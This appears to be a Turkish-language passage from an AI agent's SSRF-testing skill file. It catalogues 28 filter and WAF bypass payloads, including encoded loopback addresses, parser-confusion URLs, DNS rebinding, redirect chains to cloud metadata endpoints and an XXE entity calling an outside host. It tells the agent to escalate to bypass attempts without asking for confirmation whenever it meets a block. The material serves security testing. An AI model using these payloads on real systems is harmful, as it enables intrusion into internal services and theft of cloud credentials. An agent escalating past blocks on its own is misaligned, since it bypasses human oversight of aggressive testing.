# Bypass Payload Taksonomisi — Encoding ve WAF/Filter Bypass (§8.1–§8.2.6)

> **Not:** Bu dosyadaki `§X.Y` referansları, orijinal SSRF skill'inin tek parça numaralandırma şemasını birebir korur. Eğer burada başka bir dosyaya ait bir `§` referansı ile karşılaşırsanız, `SKILL.md` içindeki **"Referans Dosyaları ve Bölüm Haritası"** tablosundan hangi dosyaya bakmanız gerektiğini bulabilirsiniz.

## 8.1 SSRF Korumalarının Genel Modeli — Hipotez Listesi (Kesin İkili Sınıflandırma Değil)

**Önemli düzeltme:** Gerçek hedeflerde koruma mekanizmaları çoğunlukla
**tek bir model değil, birden fazla katmanın üst üste binmesidir**
(örn. hem bir IP-range blacklist'i hem ayrıca bir DNS-validation adımı
hem de bir egress firewall aynı anda bulunabilir). Bu nedenle §7'deki
"kesin karar ağacı değil, ranking" ilkesi burada da uygulanır — tek
bir "blacklist mi allowlist mi" sorusuna kesin cevap aramak yerine,
gözlemlenen davranışa göre **birden fazla hipotezi paralel** tut:

```
protection_hypotheses:
  - blacklist (IP/hostname bazlı reddetme)
  - allowlist (yalnızca belirli domain/IP'lere izin)
  - DNS-validation (yalnızca DNS çözümleme sonucu kontrol ediliyor,
    sonraki bağlantı adımı ayrıca kontrol edilmiyor olabilir — TOCTOU
    riski, bkz. §3.5)
  - IP-range-validation (çözümlenen IP'nin bir CIDR bloğuna göre
    kontrolü — B17'nin hedeflediği model)
  - redirect-validation (yalnızca ilk hedef kontrol ediliyor, redirect
    sonrası tekrar kontrol var mı belirsiz — bkz. §8.2.4 revalidation)
  - egress-filter (network seviyesinde bir firewall/security-group
    kısıtlaması — uygulama kodu hiç filtrelemiyor olabilir, engel
    tamamen network katmanında)
  - parser-mismatch (validation ve asıl istek farklı URL parser'lar
    kullanıyor — §8.2.3)
  - unknown (henüz hiçbir davranış gözlemlenmedi)
```

Her yeni gözlem (bir bypass denemesinin başarılı/başarısız olması,
hangi encoding'in çalıştığı, redirect'in tekrar kontrol edilip
edilmediği) bu hipotezlerden bazılarını `ruled-out`, bazılarını
`leading` yapar — §7'deki aynı durum etiketleme mantığı (`leading`/
`candidate`/`ruled-out`) burada da geçerlidir. Örnek referans (eski
iki-model açıklaması artık bu genel listenin **alt kümesidir**):

- **Blacklist ağırlıklı hipotez:** Bilinen "tehlikeli" hedefleri
  (localhost, `169.254.169.254`, RFC1918 private range'leri) reddeder,
  geri kalan her şeye izin verir. **Doğası gereği eksiktir** — bypass
  hedefi, blacklist'in **tanımadığı** bir temsil bulmaktır.
- **Allowlist ağırlıklı hipotez:** Yalnızca belirli bir domain/IP
  listesine izin verir. Bypass hedefi, allowlist'teki bir domain'in
  **kontrolünü ele geçirmek** (open redirect zinciri, DNS rebinding)
  veya allowlist kontrolünün **parser farkı** yüzünden atlatılmasıdır
  (bkz. §8.2.4).

**Pratik sonuç:** Bir bypass kategorisi (§8.2) negatif dönse bile,
bu "koruma yok" ya da "tek bir model" anlamına gelmez — birden fazla
katman aynı anda aktif olabilir; bir hipotezi elemek diğerlerini
otomatik doğrulamaz, her biri kendi kanıtıyla değerlendirilmelidir.

## 8.2 Bypass Payload Taksonomisi (B1–B28)

**KRİTİK DAVRANIŞ KURALI — SSRF-ile-ilgili bir blok sinyali alındığında
otomatik geçiş:** Bir generic detection/confirmation probe'u (§5) bir
**engelleme sinyali** (HTTP 403/401/406, bir WAF'a özgü blok sayfası,
"forbidden"/"blocked" içerikli bir hata mesajı, veya beklenmedik bir
şekilde boş/kesilmiş bir response) döndürdüğünde, agent **ek onay
beklemeden** doğrudan aşağıdaki §8.2.1'deki sıraya göre bypass
denemelerine geçer — **ama önce** blok sinyalinin gerçekten URL/
hedef değeriyle ilgili olup olmadığına bakar (bu ayrım, gereksiz
bypass denemesi yapmamak için, ek onay istemeden agent'ın kendi
içinde anında karar verdiği bir filtredir, ayrı bir soru sormaz):

- **SSRF-ile-ilgili blok (bypass'a geç):** Blok, **yalnızca** internal/
  şüpheli görünen bir hedef (örn. `169.254.169.254`, `127.0.0.1`,
  bilinen bir canary formatı) gönderildiğinde tetikleniyor, ama aynı
  parametreye **geçerli/harici** bir URL (örn. `https://example.com`)
  gönderildiğinde tetiklenmiyorsa → bu, hedef-değerine özgü bir
  filtredir, doğrudan bypass denemesine geç.
- **Genel/ilgisiz blok (bypass'a geçme, bu adayı farklı ele al):**
  Blok, hedef URL'in içeriğinden **bağımsız olarak** her istekte
  ortaya çıkıyorsa (örn. auth eksikliği, CSRF token eksikliği, genel
  rate-limiting, endpoint'in kendisi için bir yetkilendirme kısıtı)
  → bu SSRF'e özgü bir filtre değildir, URL encoding varyantları
  denemek bu bloğu **açmayacaktır**; bunun yerine önce bu genel
  engeli (auth/CSRF/rate-limit) aşmak veya bu adayı geçici olarak
  bekleyen listeye almak daha verimlidir. Bu ayrım tek bir ek istekle
  (aynı parametreye zararsız bir URL göndererek) hızlıca yapılabilir.

**`block_origin` sınıflandırması (opsiyonel, raporlama/state için
faydalı bir etiket):** Yukarıdaki iki-yollu ayrımı biraz daha
ayrıntılandırmak istenirse, blok şu kategorilerden birine
atfedilebilir: `application` (uygulamanın kendi SSRF filtresi),
`waf` (üçüncü taraf bir WAF ürünü), `cdn` (CDN katmanının kendi
kuralı), `proxy` (bir reverse-proxy/gateway kısıtlaması),
`authentication` (401 — kimlik doğrulama eksik), `authorization`
(403 ama yetki/rol sorunu, hedefle ilgisiz), `unknown` (kaynağı
belirlenemedi). **Kural: `unknown` durumunda varsayılan davranış
bypass denemeye devam etmektir** — belirsizlik bir "dur" sinyaline
çevrilmez, yalnızca yukarıdaki iki-yollu hızlı testle (zararsız URL
karşılaştırması) mümkün olduğunca netleştirilmeye çalışılır.

Bu filtre, testin varsayılan agresifliğini **azaltmaz** — yalnızca
açıkça alakasız bir 403'e karşı onlarca IP-encoding varyantını boşuna
denemekten kaçınır. Belirsizlik durumunda (blok sinyalinin
kaynağı net değilse) varsayılan **yine bypass denemesine geçmektir**
— bu skill'in genel fail-safe ilkesi (§1.3) "belirsizlikte düşük
classification'a düş" der, ama bu yalnızca **sınıflandırma**
kararları için geçerlidir, **hangi testin deneneceği** kararı için
değil; test etmek her zaman düşük maliyetlidir, atlamak ise false
negative riski taşır.

403 tek başına "SSRF yok" anlamına gelmez, yalnızca "bir koruma
katmanı bu spesifik temsili tanıdı" anlamına gelir (bkz. §8.1 koruma
hipotez listesi). Bypass denemeleri de negatif dönerse
(§8.2.1'deki tüm kategoriler tükenirse) ancak o zaman "engellenmiş/
inconclusive" olarak sınıflandırılır (§8.4) — art arda gelen 403'ler
kendi başına
bir "dur" sinyali değildir, yalnızca §10.6'daki request bütçesi/
rate-limit backoff kuralları devreye girer.

**Olgunluk etiketleri (maturity) — hiçbir teknik "yasak" değildir, bu
yalnızca deneme sırasını akıllandıran bir önceliklendirme katmanıdır:**
- **core:** Yaygın, düşük efor, yüksek başarı ihtimalli, hemen hemen
  her hedefte denenmeye değer.
- **common:** İyi bilinen, birçok dil/framework'te çalışan standart
  teknikler.
- **parser-specific:** Yalnızca belirli bir URL parser/dil ailesinde
  işe yarar, önce fingerprint gerektirir.
- **framework/client-specific:** Yalnızca belirli bir HTTP
  client/kütüphane (örn. curl) kullanıldığı doğrulandığında anlamlı.
- **provider-specific:** Yalnızca belirli bir cloud/altyapı
  sağlayıcısına özgü.
- **experimental:** Teorik olarak ilgi çekici ama gerçek dünyada
  doğrulanmış tekrarlanabilirliği sınırlı — yalnızca daha olgun
  kategoriler tükendiğinde, son çare olarak denenmeli.

| Kod | Kategori | Olgunluk | Örnek |
|---|---|---|---|
| B1 | IP encoding — decimal | core | `http://2130706433/` (`127.0.0.1`'in decimal karşılığı) |
| B2 | IP encoding — octal | core | `http://0177.0.0.1/` (`127.0.0.1`'in octal karşılığı) |
| B3 | IP encoding — hex | core | `http://0x7f.0x0.0x0.0x1/` veya `http://0x7f000001/` |
| B4 | IP encoding — mixed/kısaltılmış | core | `http://127.1/`, `http://0/` (`0.0.0.0` kısaltması) |
| B5 | IPv6 loopback/mapped varyantları | common | `http://[::1]/`, `http://[0:0:0:0:0:ffff:127.0.0.1]/`, `http://[::ffff:127.0.0.1]/` |
| B6 | DNS-tabanlı bypass — validator IP'yi hiç kontrol etmiyor | common | **Önkoşul (kritik, B7'den farkı budur):** Bu yalnızca validator'ın hostname/domain'i **string olarak** kontrol edip (örn. bilinen bir "tehlikeli domain" listesine bakarak) **çözümlenen IP'yi HİÇ doğrulamadığı** durumlarda çalışır — saldırganın domain'i **kalıcı ve değişmeden** internal bir IP'ye çözümlenir (`http://spoofed.attacker-domain.com/` → DNS kaydı sabit olarak `127.0.0.1`'i gösterir), TTL/zamanlama oyunu **gerektirmez**. Eğer validator DNS çözümlemesi **sonrası** IP'yi de kontrol ediyorsa (çözümlenen IP private/loopback range'de mi diye bakıyorsa) B6 **işe yaramaz** — bu durumda gerekli teknik B7'dir (validator IP'yi kontrol ediyor ama yalnızca YANLIŞ ZAMANDA — TTL/rebinding ile validation ve asıl istek farklı IP görür) |
| B7 | DNS rebinding (TOCTOU) | common | İlk (validation) sorguda zararsız IP, TTL süresi dolduktan sonraki (asıl istek) sorguda internal IP döndürme — bkz. §3.5, hazır servis/araç için §15 |
| B8 | URL parser confusion — userinfo | common | `http://expected-safe-domain.com@169.254.169.254/` (bazı parser'lar `@` öncesini host sanır, bazıları sonrasını) |
| B9 | URL parser confusion — fragment/backslash | parser-specific | `http://169.254.169.254#@expected-safe-domain.com/`, `http:/\/\169.254.169.254` (bazı parser'lar `\`'ı `/` olarak normalize eder) — genişletilmiş varyantlar için §8.2.3 |
| B10 | Redirect zinciri (allowlist bypass) | core | Allowlist'teki bir domain'e istek attır, o domain saldırganın kontrolündeki bir 302/307/308 redirect ile internal hedefe yönlendirir (sunucu tarafı HTTP client redirect'i **otomatik takip ediyorsa** çalışır — 307/308 kullanımı için §8.2.4) |
| B11 | Case/whitespace/null-byte injection | experimental (null-byte kısmı legacy) | `http://127.0.0.1%00.expected-domain.com` — modern dil/kütüphanelerin (Python 3, Java, PHP 5.3.4+) çoğunda string içinde null-byte artık geçerli bir terminator olarak işlenmez, bu nedenle güncel hedeflerde düşük başarı ihtimalli bir legacy teknik olarak değerlendirilmeli; boşluk/tab karakterleri (null-byte'tan bağımsız olarak) hâlâ parser'a göre farklı yorumlanabilir |
| B12 | Alternatif protokol şeması | core | Blacklist yalnızca `http`/`https` kontrol ediyorsa `gopher://`, `dict://`, `file://`, `ws://`/`wss://` şemaları hiç kontrol edilmemiş olabilir (bkz. §12.1 WebSocket, §12.2 file://, §12.3 gopher://, §12.4 dict://) |
| B13 | Double URL-encoding | common | `%25` ile encode edilmiş karakterler — bazı validator'lar tek decode sonrası kontrol yapıp, uygulamanın kendisi ikinci bir decode daha yapıyorsa |
| B14 | Domain/string-match confusion (blacklist naive string kontrolü varsa) | common | `169.254.169.254.expected-domain.com` gibi bir subdomain deseni — **KRİTİK DÜZELTME: bu, DNS açısından `expected-domain.com`'un bir alt domain'idir ve saldırganın kontrol ettiği bir IP'ye çözümlenir, doğrudan `169.254.169.254`'e değil.** Bu teknik şunu hedefler: validator'ın `"169.254.169.254"` string'ini hostname içinde arayıp (contains/substring kontrolü ile) "tehlikeli" sayacak naif bir blacklist mantığını **kandırmak**. Gerçekte bu payloada saldırganın seçtiği bir IP ulaşır — eğer asıl hedef 169.254.169.254'e erişimse, B14 tek başına bunu sağlamaz; bu tekniğin SSRF için anlamlı olması şu koşula bağlıdır: validator hostname'i kontrol ediyor ama **çözümlenen IP'yi hiç kontrol etmiyor** (bkz. B6), bu durumda saldırgan kendi domain'ini gerçekten 169.254.169.254'e çözümleyip B6 ile birleştirebilir — B14 burada yalnızca naif validator'ı "169.254.169.254 string'i yok, güvenli" diye düşündüren bir aldatmaca katmanıdır |
| B15 | Wildcard/subdomain allowlist zaafı | common | Allowlist `*.expected-domain.com` şeklindeyse, saldırganın kontrolündeki `evil.expected-domain.com` (eğer subdomain devralma/kayıt mümkünse) veya bir subdomain'in saldırgan tarafından kontrol edilebilir olması |
| B16 | Scheme-relative / eksik şema normalizasyonu | common | `//169.254.169.254/` (bazı context'lerde şema otomatik `https:` olarak tamamlanır ve blacklist yalnızca tam URL string'ini kontrol ediyorsa atlanabilir) |
| B17 | CIDR/loopback range genişletmesi | core | Yalnızca `127.0.0.1` filtreleniyor olabilir — `127.0.0.0/8` bloğundaki **herhangi bir** adres (`127.127.127.127`, `127.0.1.3`, `127.0.0.0`, kısaltılmış `127.1`) de loopback'e eşdeğerdir, çoğu filtre yalnızca tam string `127.0.0.1`'i arar |
| B18a | Unicode separator ikamesi (hostname normalization) | experimental (fingerprint-önce) | Nokta (`.`) yerine ideographic full stop `。` (U+3002) veya benzeri Unicode "separator" karakterleri (`127。0。0。1`) — bu, IDNA/punycode normalizasyon zincirinden geçen bazı hostname parser'larının bu karakterleri gerçekten `.`'a eşdeğer saydığı **belgelenmiş bir davranıştır** (Unicode Technical Standard'daki "label separator" eşdeğerleri) — **yalnızca** hedefin IDNA normalizasyonu uyguladığına dair bir sinyal varsa (§8.2.3 URL Parser Matrix, veya IDN'e özgü bir davranış gözlemlenmişse) denenmeli |
| B18b | Circled-digit glyph ikamesi (rakam yerine) | highly-speculative (yalnızca son çare) | Rakam yerine circled digit glyph'leri (`①②⑦.⓪.⓪.⓪`) — B18a'dan farklı olarak bunun **standart bir Unicode normalizasyon kuralı** (NFKC gibi agresif bir normalizasyon dışında) tarafından desteklendiğine dair yaygın bir emsal yoktur; çoğu URL/IP parser bu glyph'leri hiç tanımaz ve payload olduğu gibi başarısız olur — yalnızca hedefin **özellikle** NFKC-tarzı agresif bir Unicode normalizasyonu uyguladığı ayrıca doğrulanmışsa (nadir) denenmeli, aksi halde düşük getirili bir request harcamasıdır |
| B19 | Malformed/eksik şema-ayracı | parser-specific | `http:127.0.0.1/` (çift slash olmadan), `http:@0/` → bazı parser'larda `http://localhost/`'a eşdeğer, `localhost:+11211aaa` gibi bozuk port formatları |
| B20 | curl URL globbing ile path obfuscation | framework/client-specific | curl'ün brace-expansion (`{a,b}`) ve range (`[1-9]`) "globbing" özelliği, `file://` üzerinden path traversal karakterlerini WAF pattern-matching'inden gizlemek için kullanılabilir — bkz. §8.2.5 |
| B21 | Anormal redirect status code zinciri | experimental (default-off, §8.2.5'teki 3 önkoşul karşılanmadan denenmez) | 301 dışındaki nadir/"tuhaf" 3xx kodlarının (305-310 aralığı gibi) art arda gönderilmesi, bazı HTTP client wrapper'larını "beklenmeyen durum" moduna sokup normal redirect-hedef doğrulamasını atlatabilir — bkz. §8.2.5 |
| B22 | Raw-string validation vs parsed-URL request — path-suffix zorunluluğu atlatma | conditional | **Önkoşul (mekanizma netliği için kritik):** Bu yalnızca validator'ın URL'i **ham string** olarak kontrol edip (örn. "sonunda `.jpg` var mı" diye regex/string kontrolü yaparak), asıl outbound isteği **standart bir URL parser** ile (fragment'i RFC gereği sunucuya hiç göndermeyen, `../` traversal'ı normalize eden bir parser ile) yapan sistemlerde çalışır — validator da parser kullanıyorsa (fragment'i validator da görmüyorsa) bu bypass **işe yaramaz**. Örnekler: `#/expected/path`, `#.extension` (fragment, ham string kontrolünü geçirir ama HTTP request-line'ına hiç dahil edilmez — bu davranış URL parser'ların RFC 3986 uyumluluğundan kaynaklanır, sunucu tarafı bir "gizleme" değildir) veya `expected/path/../../vulnerable/path` (path traversal — validator traversal'ı normalize etmeden ham string'i kontrol ediyorsa, parser'ın normalize ettiği gerçek hedef farklı olabilir) |
| B23 | IPv6 zone ID (scope ID) enjeksiyonu | experimental | `http://[fe80::1%25eth0]/` (`%25` = URL-encoded `%`, zone ID ayracı) — link-local IPv6 adreslerinde arayüz belirtme sözdizimi, bazı parser'lar zone ID'yi tanımayıp adresin geri kalanını farklı yorumlayabilir; ayrıca zone ID'nin kendisinin bir filtreleme boşluğu olup olmadığı da ayrıca test edilmeli |
| B24 | IDN/Unicode canonicalization mismatch ("homograph" yalnızca bir alt örneği) | conditional (parser-normalization-specific) | Bir domain allowlist'i görsel olarak `expected-domain.com`'a benzeyen ama farklı Unicode code point'lerinden oluşan bir IDN (Internationalized Domain Name) ile kaydedilmiş bir domain'i (punycode'a çevrildiğinde `xn--...` ile başlar) ayırt edemeyebilir — B18a/B18b'den farkı: B18a/B18b bir IP-literal'in içindeki karakterleri hedeflerken, B24 tamamen **domain adının kendisinin** görsel sahteciliğini hedefler. **Önkoşul (kritik — tekniğin ASIL mekanizması budur, "homograph" yalnızca yüzeysel bir belirtidir):** Bu yalnızca allowlist kontrolü ile asıl DNS resolver'ın **farklı bir canonical form** kullandığı durumlarda (örn. allowlist ham string karşılaştırması yaparken resolver IDNA normalizasyonu uyguluyorsa) bir bypass'tır — allowlist ve resolver aynı canonicalization'ı kullanıyorsa bu teknik işe yaramaz, önce bu farkın var olduğu doğrulanmalıdır |
| B25 | IPv4-compatible (deprecated) IPv6 gösterimi | experimental (legacy) | `http://[::127.0.0.1]/` — `::ffff:127.0.0.1` (IPv4-mapped, B5'te zaten var) formatından farklı olarak, RFC 4291'de deprecated edilmiş ama bazı eski network stack'lerinde hâlâ parse edilen "IPv4-compatible" format (`ffff` öneki olmadan) |
| B26 | HTTP Parameter Pollution (HPP) | common | Aynı parametre adının birden fazla kez gönderilmesi (`?url=https://expected-safe.com&url=http://169.254.169.254/`) — framework'e göre ilk veya son değer alınır; hangi katmanın (validation middleware'i mi, asıl handler mı) hangi değeri okuduğu framework'e özgü davranış farkı yaratabilir |
| B27 | JSON parametre array injection | common | Body bir JSON API'ye gidiyorsa, tekil string beklenen bir alana array göndermek (`{"url": ["https://expected-safe.com", "http://169.254.169.254/"]}`) — bazı JSON deserializer'lar/framework'ler bunu sessizce ilk veya son elemana indirger, validation ile asıl kullanım arasında B26'ya benzer bir okuma farkı yaratabilir |
| B28 | XXE parameter entity üzerinden dolaylı SSRF (bkz. §3.3) | parser-specific | `<!DOCTYPE foo [ <!ENTITY % pe SYSTEM "http://<canary>.oast.fun/"> %pe; ]>` — genel entity (`&xxe;`) yerine parameter entity (`%pe;`) kullanımı, bazı XML parser konfigürasyonlarında farklı bir kısıtlama/validation code path'inden geçtiği için genel entity'nin engellendiği durumlarda dahi çalışabilir; bu skill'in kapsamı yalnızca **sonucun** SSRF hedeflemesidir, parameter entity'nin XML-seviyesi detection/bypass metodolojisi ayrı bir XXE skill'inin konusudur (§3.3) |

**Deneme sırası kuralı:** §8.2.1'deki agresiflik sıralamasına ek
olarak, **aynı agresiflik kademesinde** birden fazla teknik varsa,
önce `core` → `common` → `parser/framework/provider-specific` →
`experimental` sırasıyla dene. `experimental` etiketli bir teknik
**yasak değildir**, yalnızca diğerleri tükenmeden önce denenmesi
verimsizdir.

Bu tablo **denenecek payload listesi değil**, bir sınıflandırmadır —
sıralı deneme stratejisi §8.2.1'de.

**Kasıtlı olarak eklenmeyenler (değerlendirilip reddedildi):**
- **`data:` URI'ler** — bu skill'in kapsamına girmez, çünkü bir
  `data:` URI **hiçbir outbound network isteği tetiklemez** (içerik
  URI'nin kendisinde gömülüdür, sunucu hiçbir yere bağlanmaz) — SSRF'nin
  tanımı gereği (§0.1) "sunucunun kendisinin bir hedefe bağlanması"dır;
  bir sink `data:` URI'yi render ediyorsa bu potansiyel olarak farklı
  bir zafiyet sınıfına (örn. stored XSS, eğer render edilen içerik
  HTML ise) işaret edebilir ama SSRF değildir.
- **HTTP Trailers üzerinden enjeksiyon** — teorik olarak ilgi çekici
  ama bu skill'in yazım anındaki araştırması bunu SSRF bağlamında
  **doğrulanmış, tekrarlanabilir bir teknik** olarak destekleyecek
  yeterli somut kaynağa ulaşamadı; spekülatif/doğrulanmamış bir
  tekniği somut payload olarak eklemek yerine, hedefte HTTP/2 kullanan
  bir chunked-encoding + trailer senaryosu görülürse bunun elle
  araştırılması önerilir (bkz. §15 "hard-code edilmeyen iddialar"
  prensibi).

## 8.2.1 Bypass Deneme Sırası (Agresiflik Artan)

1. Önce **format çeşitliliği** (B1-B5, B17, B19 — IP encoding/
   loopback-range/malformed-scheme varyantları) — düşük riskli,
   genelde WAF loglarını tetiklemez.
2. Ardından **parser confusion** (B8, B9, B11, B16, B22) —
   uygulamanın kendi URL parse mantığındaki farkı hedefler.
3. Ardından **protokol şeması değişikliği** (B12) ve **curl globbing**
   (B20, yalnızca hedefin curl-tabanlı bir HTTP client kullandığı
   fingerprint edilmişse) — blacklist'in kapsamadığı bir şema/encoding
   dene.
4. Yalnızca yukarıdakiler tükendiğinde **DNS-tabanlı** (B6, B7, B14 —
   B14 yalnızca bir "aldatmaca katmanı"dır, B6/B7 ile birlikte
   kullanılmalıdır, bkz. B14'ün düzeltilmiş tanımı) — bunlar genelde
   saldırganın kendi DNS sunucusunu/kaydını kontrol etmesini
   gerektirir, daha fazla hazırlık ister.
5. **Yalnızca ilgili fingerprint sinyali gözlemlendiyse** (§8.2.3 URL
   Parser Matrix, veya hedefin Unicode/IDN normalizasyonu uyguladığına
   dair başka bir kanıt) — Unicode/IDN tabanlı teknikler (**B18a**
   önce, **B18b** yalnızca B18a de negatif dönerse ve NFKC-tarzı bir
   normalizasyon ayrıca doğrulanmışsa; **B24** allowlist/resolver
   canonicalization farkı tespit edilmişse). Bu fingerprint sinyali
   yoksa bu aşama tamamen atlanır — körlemesine denenmez.
6. Son olarak **redirect zinciri** (B10), **allowlist zaafı** (B15) ve
   **anormal redirect status code zinciri** (B21) — yalnızca allowlist
   modeli tespit edildiğinde veya standart redirect zinciri (B10)
   negatif döndüğünde anlamlıdır (B21, B10'un daha agresif bir
   varyantıdır, kendi §8.2.5'teki 3 önkoşulu ayrıca sağlanmalıdır).

## 8.2.2 IP Encoding Varyantları — Tam Referans Tablosu

`127.0.0.1` hedefi için denenebilecek temsiller (aynı mantık herhangi
bir internal IP'ye uygulanabilir):

| Format | Örnek |
|---|---|
| Decimal (tam sayı) | `2130706433` |
| Octal (nokta ayraçlı) | `0177.0000.0000.0001` |
| Hex (nokta ayraçlı) | `0x7f.0x0.0x0.0x1` |
| Hex (tam sayı) | `0x7f000001` |
| Kısaltılmış (2 parça) | `127.1` |
| Kısaltılmış (3 parça) | `127.0.1` |
| Karışık taban | `0x7f.0.0.1`, `127.0.0.01` (öndeki sıfır bazı parser'larda octal sanılabilir) |
| IPv6-mapped IPv4 | `::ffff:127.0.0.1`, `::ffff:7f00:1` |
| IPv6 loopback (gerçek loopback) | `::1`, `[0000::1]` |
| IPv6/IPv4 unspecified address (loopback DEĞİL, ama OS'a göre pratikte eşdeğer davranabilir — bkz. §5 teknik not) | `[::]`, `0.0.0.0` |
| **CIDR/loopback range genişletmesi (B17)** | `127.127.127.127`, `127.0.1.3`, `127.0.0.0` — `127.0.0.0/8` bloğundaki **herhangi bir** adres loopback'tir, yalnızca `127.0.0.1` filtrelenmiş olabilir |
| **Unicode separator ikamesi (B18a)** | `127。0。0。1` (nokta yerine ideographic full stop `。`, U+3002) |
| **Circled-digit glyph ikamesi (B18b, highly-speculative)** | `①②⑦.⓪.⓪.⓪` (rakam yerine circled-digit glyph'leri) |
| **Malformed/eksik ayraç (B19)** | `http:127.0.0.1/` (şema sonrası `//` olmadan), `http:@0/` → bazı parser'larda `http://localhost/`'a eşdeğer |

**Kullanım kuralı:** Bu varyantların hepsini körlemesine denemek
yerine, önce hangi katmanın (uygulamanın kendi validator'ı mı, önündeki
bir WAF mı) IP'yi kontrol ettiğini §8.1'deki modelle belirle, sonra bu
tablodan agresiflik sırasına göre 3-4 varyant dene — hepsi negatif
dönerse hedefin IP formatını normalize ettikten sonra kontrol ettiği
sonucuna var. Onlarca varyantı elle üretmek yerine **ipfuscator**
(bkz. §15) gibi bir üretici araçla otomatikleştirilebilir.

## 8.2.3 URL Parser Confusion — Derinlemesine

Farklı diller/kütüphaneler bir URL'i **farklı** parse edebilir — bu
fark, "validation bu kütüphaneyle, asıl istek şu kütüphaneyle
yapılıyor" senaryolarında (örn. bir güvenlik middleware'i Python'un
`urllib.parse` ile kontrol ediyor, asıl istek `requests` kütüphanesiyle
atılıyor — ikisi teorik olarak aynı olmalı ama edge-case'lerde
farklılaşabilir) bir bypass fırsatı yaratır. Bu alandaki en kapsamlı
akademik referans Orange Tsai'nin **"A New Era of SSRF — Exploiting
URL Parser in Trending Programming Languages"** araştırmasıdır (bkz.
§15) — birçok dilin URL parser'ının RFC 3986'yı birbirinden farklı
yorumladığını gösterir.

**En sık karşılaşılan parser farkı — userinfo (`@`) ayrıştırması:**
```
http://trusted-domain.com@169.254.169.254/
```
RFC 3986'ya göre `@` öncesi userinfo'dur, `@` sonrası gerçek host'tur
— yani bu URL'in **gerçek hedefi** `169.254.169.254`'tür. Ama bazı
naif regex-tabanlı "domain kontrolü" implementasyonları yalnızca
string'in **başlangıcında** `trusted-domain.com` arayıp geçerli sayar.

**İkinci sık fark — birden fazla `@` işareti:**
```
http://trusted-domain.com@evil.com@169.254.169.254/
```
Bazı parser'lar **son** `@`'dan sonrasını host sayar, bazıları
**ilk** `@`'dan sonrasını — bu farkı test ederek hangi parser'ın
kullanıldığı da fingerprint edilebilir (§7).

**Üçüncü sık fark — backslash + çoklu `@` kombinasyonları (Orange
Tsai'nin araştırmasından, farklı dillerin parser'larını birbirinden
ayırt etmek için özellikle etkili bir set — hepsi ayrı ayrı denenmeli,
her biri farklı bir parser implementasyon hatasını hedefler):**
```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```
Bu dört varyantın her biri farklı bir "hangi kısım host, hangi kısım
userinfo/fragment" belirsizliğini test eder — bir parser `127.1.1.1`'i
host sanırken (validation bunu görür ve "izinli" diye işaretler),
gerçek istek `127.2.2.2`'ye gidebilir (veya tam tersi).

**Dördüncü fark — şema sonrası çift slash'ın tamamen eksik olması:**
```
http:127.0.0.1/
```
RFC'ye göre bu **geçersiz** bir URL'dir, ama bazı diller/kütüphaneler
(özellikle bazı eski Java/Python URL implementasyonları) bunu hataya
düşürmeden `127.0.0.1`'e istek atan geçerli bir URL olarak kabul eder
— bu, hem bir bypass hem de bir fingerprint sinyalidir (bkz. B19,
§8.2.2).

**URL Parser Matrix — dil/client fingerprint'inden hangi edge-case'e
öncelik verileceğine hızlı geçiş:** §7'de hedefin dilini/HTTP
client'ını fingerprint ettikten sonra, aşağıdaki tablo o dile/client'a
**özgü olarak bilinen** parser edge-case'ini önceliklendirmeyi sağlar
— bu bir kesin davranış garantisi değildir (sürüme göre değişir),
ama hangi bypass ailesinin (B8/B9/B19/B24/vb.) o hedefte denenmeye
**değer** olduğunu hızlıca daraltır:

| Dil/Stack | Yaygın Parser/Client | Öncelikli Edge-Case |
|---|---|---|
| Python | `urllib.parse` / `requests` | Genel URL canonicalization farkları; `requests` bazen `urllib3` üzerinden farklı bir normalizasyon uygular — validation ve istek farklı kütüphane kullanıyorsa özellikle kontrol et |
| Java | `java.net.URI` / `java.net.URL` | Scheme/authority ayrıştırma farkları (`URI` RFC 3986'ya daha sıkı uyar, `URL` daha toleranslıdır) — aynı string'in ikisinde farklı parse edilmesi mümkündür |
| Node.js | WHATWG URL (`new URL()`) | Backslash normalizasyonu (`\` bazı bağlamlarda `/`'e çevrilir) — B9'daki backslash confusion burada özellikle etkilidir |
| PHP | `parse_url()` / cURL | `parse_url()` (validation'da kullanılır) ile cURL'ün (asıl istekte kullanılır) **farklı kütüphaneler** olması — ikisi arasında canonicalization farkı klasik bir PHP SSRF deseni |
| .NET | `System.Uri` / `HttpClient` | `Uri` sınıfının kendi canonicalization'ı (bazı karakterleri otomatik encode/decode eder) — validation regex'i bu canonicalization'dan **önce mi sonra mı** çalışıyor, önemli bir fark yaratır |
| Go | `net/url` / `net/http` | Parsing (`net/url`) ile request-yapma (`net/http`) davranışının ayrı olması — `net/url` geçerli saydığı bir URL'i `net/http`'nin farklı yorumlaması mümkündür |

**Kullanım kuralı:** Bu tablo, §7 fingerprinting sonucunda hedefin
dili/stack'i makul bir güvenle belirlendiğinde, o satırdaki edge-case'i
**ilk sırada** denemeyi önerir — kesin değildir, sürüm/kütüphane
seçimine göre değişir, ama körlemesine tüm B8/B9/B19/B24 varyantlarını
sırasıyla denemekten daha verimlidir.

## 8.2.4 Redirect-Tabanlı Allowlist Bypass — Detaylı Akış

```
1. Kendi kontrolündeki bir HTTP sunucusu kur (veya bir "redirect
   servisi" kullan — bkz. §15 r3dir aracı, kendi sunucu barındırmadan
   seamless redirect target fuzzing sağlar)
2. Bu sunucunun ürettiği 301/302/307/308 response'unun Location
   header'ını hedef internal adrese (örn. http://169.254.169.254/
   latest/meta-data/) ayarla
3. Hedef uygulamaya, allowlist'te olduğunu bildiğin (veya olması
   muhtemel) bir domain yerine SENİN sunucunun URL'ini ver
4. Eğer hedef uygulamanın HTTP client'ı redirect'i OTOMATİK takip
   ediyorsa (çoğu HTTP client kütüphanesinin varsayılan davranışı),
   asıl istek internal hedefe gider
```

**Status code seçimi — KRİTİK nüans:** Sink'in orijinal isteği bir
`POST` ve/veya belirli bir body/header ile atması gerekiyorsa (örn.
bir webhook doğrulama isteği, imzalı bir body içeriyorsa), **301/302/303**
kullanma — bu kodlar RFC 7231 gereği bazı client'larda metodu
otomatik `GET`'e düşürür ve body'yi düşürebilir. Bunun yerine
**307 (Temporary Redirect)** veya **308 (Permanent Redirect)**
kullan — bu ikisi orijinal HTTP metodunu ve body'yi **korur**, bu da
redirect zincirinin sink'in beklediği isteği internal hedefe
olduğu gibi taşımasını sağlar.

**Önkoşul kontrolü:** Bu teknik yalnızca hedefin **allowlist** modeli
